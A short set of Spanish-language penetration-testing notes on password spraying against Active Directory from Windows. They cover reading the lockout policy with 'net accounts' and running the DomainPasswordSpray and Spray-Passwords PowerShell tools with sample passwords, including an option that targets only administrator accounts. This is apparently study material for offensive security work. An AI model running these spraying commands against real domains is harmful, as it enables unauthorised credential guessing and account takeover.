# Desde windows
#### Vemos las password policy para ver cuántos intentos tenemos

    net accounts

Las columnas importantes son:

- Lockout threshhold (nos dice cuantos intentos fallidos tenemos)
- Lockout duration (cuánto tiempo dura el blockeo)
- lockout observation window (cuando se renuevan a 0 los intentos fallidos)

### DomainPaswordSpray:

De manera automática va a generar una lista de usuarios del AD, ver las políticas de pass y quitar los users que están a un paso de quedar bloqueados

    Import-Module .\DomainPasswordSpray.ps1
    Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

### Spray-Passwords

    .\Spray-Passwords.ps1 -Pass Nexus123!

Podemos usar la flag -Admin para que solo pruebe con usuarios administradores.

